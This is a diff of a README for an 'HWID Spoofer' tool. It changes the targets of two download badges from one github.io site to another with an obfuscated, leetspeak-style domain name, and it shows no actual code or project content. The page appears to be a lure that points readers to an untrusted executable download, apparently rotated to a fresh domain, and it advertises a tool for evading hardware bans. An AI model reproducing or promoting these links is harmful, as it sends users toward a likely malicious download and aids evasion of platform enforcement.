@@ -1,7 +1,7 @@
 # 🔒 HWID Spoofer —  Mask Tool
 
-[![Download Spoofer](https://img.shields.io/badge/Download_Spoofer-darkorange?style=for-the-badge)](https://hwidtoolspoofinfo012.github.io/.github/)  
-[![Change HWID](https://img.shields.io/badge/Change_HWID-lightgrey?style=for-the-badge&logo=windows)](https://hwidtoolspoofinfo012.github.io/.github/)
+[![Download Spoofer](https://img.shields.io/badge/Download_Spoofer-darkorange?style=for-the-badge)](https://hwid1sp00fer99inf0.github.io/.github/)  
+[![Change HWID](https://img.shields.io/badge/Change_HWID-lightgrey?style=for-the-badge&logo=windows)](https://hwid1sp00fer99inf0.github.io/.github/)
 
 
 ---
